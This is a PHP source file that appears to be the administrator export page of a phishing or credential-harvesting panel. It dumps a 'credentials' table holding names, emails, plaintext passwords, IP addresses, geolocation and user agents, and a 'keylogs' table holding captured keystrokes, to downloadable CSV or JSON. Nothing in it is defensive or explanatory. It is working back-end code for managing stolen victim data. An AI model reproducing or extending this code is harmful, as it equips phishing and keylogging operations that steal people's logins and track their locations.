<?php
require_once __DIR__ . '/functions.php';
requireAdmin();

$format = $_GET['format'] ?? 'csv';
$type = $_GET['type'] ?? 'credentials';

$data = $type === 'credentials'
    ? $pdo->query("SELECT * FROM credentials ORDER BY created_at DESC")->fetchAll(PDO::FETCH_ASSOC)
    : $pdo->query("SELECT * FROM keylogs ORDER BY created_at DESC")->fetchAll(PDO::FETCH_ASSOC);

if ($format === 'json') {
    header('Content-Type: application/json; charset=utf-8');
    header('Content-Disposition: attachment; filename="'.$type.'_export_'.date('Y-m-d').'.json"');
    echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

header('Content-Type: text/csv; charset=utf-8');
header('Content-Disposition: attachment; filename="'.$type.'_export_'.date('Y-m-d').'.csv"');
$out = fopen('php://output', 'w');
if ($type === 'credentials') {
    fputcsv($out, ['ID','Name','Email','Password','IP','Country','City','Latitude','Longitude','User Agent','Date']);
    foreach ($data as $r) fputcsv($out, [$r['id'],$r['name'],$r['email'],$r['password'],$r['ip'],$r['country'],$r['city'],$r['lat'],$r['lon'],$r['user_agent'],$r['created_at']]);
} else {
    fputcsv($out, ['ID','Email','Key Data','Field Context','Full Log','Date']);
    foreach ($data as $r) fputcsv($out, [$r['id'],$r['email_identifier'],$r['key_data'],$r['field_context'],$r['full_log'],$r['created_at']]);
}
fclose($out);
exit;
